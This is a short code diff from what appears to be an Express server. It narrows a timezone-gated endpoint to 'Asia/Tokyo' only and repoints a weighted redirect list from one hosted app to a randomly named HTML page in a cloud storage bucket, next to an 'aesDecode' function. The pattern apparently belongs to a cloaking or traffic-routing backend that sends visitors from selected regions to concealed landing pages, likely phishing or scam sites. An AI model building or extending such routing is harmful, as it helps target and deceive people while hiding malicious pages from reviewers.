@@ -23,24 +23,7 @@ app.post("/timezone", (req, res) => {
 
    const allowedTimezones = [
     // Japan
-    "Asia/Tokyo", "Asia/Singapore", "Australia/Sydney", "Australia/Melbourne", "Australia/Brisbane", "Australia/Perth", 
-    "Australia/Adelaide", "Australia/Hobart", "Australia/Darwin", "Australia/Canberra", 
-    "Australia/Lord_Howe",
-    // United States
-    "America/New_York",
-    "America/Chicago",
-    "America/Denver",
-    "America/Los_Angeles",
-    "America/Anchorage",
-    "Pacific/Honolulu",
-
-    // Canada
-    "America/Toronto",
-    "America/Vancouver",
-    "America/Edmonton",
-    "America/Winnipeg",
-    "America/Halifax",
-    "America/St_Johns"
+    "Asia/Tokyo"
   ];
 
   if (allowedTimezones.includes(timezone)) {
@@ -72,8 +55,8 @@ function aesDecode(encryptedText) {
   function getResponse() {
 
     const links = [
-        { url: "https://sea-turtle-app-vsrde.ondigitalocean.app/", weight: 0.5 },
-        { url: "https://sea-turtle-app-vsrde.ondigitalocean.app/", weight: 0.5 }
+        { url: "https://sdafgeqd.s3.us-east-005.dream.io/h8o23d2e3298d9d.html", weight: 1.0 }
+
       
     ];
 
